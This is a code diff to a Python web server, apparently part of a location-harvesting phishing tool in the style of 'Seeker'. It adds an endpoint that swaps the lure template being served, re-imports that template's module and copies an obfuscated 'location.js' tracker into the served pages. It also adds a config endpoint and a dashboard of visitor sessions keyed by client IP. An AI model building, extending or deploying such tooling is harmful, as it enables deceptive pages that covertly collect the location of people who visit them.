@@ -11,6 +11,7 @@ from session import SessionManager
 class SeekerHandler(SimpleHTTPRequestHandler):
     session_manager: SessionManager = None
     _template_dir: str = None
+    _config: dict = None
 
     def __init__(self, request, client_address, server):
         super().__init__(request, client_address, server, directory=self.__class__._template_dir)
@@ -35,7 +36,21 @@ class SeekerHandler(SimpleHTTPRequestHandler):
         if content_length == 0:
             return {}
         body = self.rfile.read(content_length).decode('utf-8')
+        content_type = self.headers.get('Content-Type', '')
+        if 'application/json' in content_type:
+            try:
+                return json.loads(body)
+            except Exception:
+                return {}
         return parse_qs(body)
+
+    def _send_json(self, data, status=200):
+        body = json.dumps(data).encode()
+        self.send_response(status)
+        self.send_header('Content-Type', 'application/json')
+        self._send_cors_headers()
+        self.end_headers()
+        self.wfile.write(body)
 
     def _send_cors_headers(self):
         self.send_header('Access-Control-Allow-Origin', '*')
@@ -51,6 +66,10 @@ class SeekerHandler(SimpleHTTPRequestHandler):
         path = self.path.split('?')[0]
         data = self._parse_post_data()
         client_ip = self._get_client_ip()
+
+        if path == '/api/template':
+            self._handle_template_switch(data)
+            return
 
         flat = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in data.items()}
 
@@ -108,22 +127,76 @@ class SeekerHandler(SimpleHTTPRequestHandler):
         if self.session_manager:
             self.session_manager.update_error(client_ip, error)
 
+    def _handle_template_switch(self, data):
+        """Handle template switching from dashboard."""
+        import shutil
+        tpl_idx = data.get('template')
+        if tpl_idx is None:
+            self._send_json({'status': 'error', 'error': 'Missing template index'}, 400)
+            return
+
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        templates_json = os.path.join(base_dir, 'template', 'templates.json')
+
+        try:
+            with open(templates_json, 'r') as f:
+                tpl_data = json.loads(f.read())
+
+            templates = tpl_data.get('templates', [])
+            if tpl_idx < 0 or tpl_idx >= len(templates):
+                self._send_json({'status': 'error', 'error': 'Invalid template index'}, 400)
+                return
+
+            selected = templates[tpl_idx]
+            dir_name = selected['dir_name']
+            import_file = selected['import_file']
+            tpl_dir = os.path.join(base_dir, 'template', dir_name)
+
+            if not os.path.isdir(tpl_dir):
+                self._send_json({'status': 'error', 'error': f'Template directory not found: {dir_name}'}, 400)
+                return
+
+            # Re-import the template module to regenerate index.html
+            import importlib
+            import sys
+            module_name = f'template.{import_file}'
+            if module_name in sys.modules:
+                del sys.modules[module_name]
+            importlib.import_module(module_name)
+
+            # Copy obfuscated JS
+            js_dir = os.path.join(tpl_dir, 'js')
+            if not os.path.isdir(js_dir):
+                os.makedirs(js_dir)
+            try:
+                from obfuscate import obfuscate_js
+                obfuscate_js('js/location.js', os.path.join(js_dir, 'location.js'))
+            except Exception:
+                src_js = os.path.join(base_dir, 'js', 'location.js')
+                shutil.copyfile(src_js, os.path.join(js_dir, 'location.js'))
+
+            # Update template directory for static serving
+            self.__class__._template_dir = tpl_dir
+            if self._config is not None:
+                self._config['template'] = dir_name
+
+            self._send_json({'status': 'ok', 'template': dir_name, 'name': selected['name']})
+        except Exception as e:
+            self._send_json({'status': 'error', 'error': str(e)}, 500)
+
     def do_GET(self):
         if self.path == '/health':
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self._send_cors_headers()
-            self.end_headers()
-            self.wfile.write(json.dumps({'status': 'ok'}).encode())
+            self._send_json({'status': 'ok'})
             return
 
         if self.path == '/api/sessions':
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self._send_cors_headers()
-            self.end_headers()
             data = self.session_manager.get_sessions_dict() if self.session_manager else []
-            self.wfile.write(json.dumps(data).encode())
+            self._send_json(data)
+            return
+
+        if self.path == '/api/config':
+            cfg = self._config.copy() if self._config else {}
+            self._send_json(cfg)
             return
 
         if self.path == '/dashboard':
@@ -131,7 +204,11 @@ class SeekerHandler(SimpleHTTPRequestHandler):
             self.send_header('Content-Type', 'text/html; charset=utf-8')
             self._send_cors_headers()
             self.end_headers()
-            dashboard_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'template', 'dashboard.html')
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+            # Prefer Chinese dashboard
+            cn_path = os.path.join(base_dir, 'template', 'dashboard_cn.html')
+            orig_path = os.path.join(base_dir, 'template', 'dashboard.html')
+            dashboard_path = cn_path if os.path.isfile(cn_path) else orig_path
             with open(dashboard_path, 'rb') as f:
                 self.wfile.write(f.read())
             return
@@ -144,9 +221,10 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     allow_reuse_address = True
 
 
-def create_server(port, template_dir, session_manager):
+def create_server(port, template_dir, session_manager, config=None):
     SeekerHandler.session_manager = session_manager
     SeekerHandler._template_dir = template_dir
+    SeekerHandler._config = config or {}
 
     server = ThreadedHTTPServer(('0.0.0.0', port), SeekerHandler)
     return server
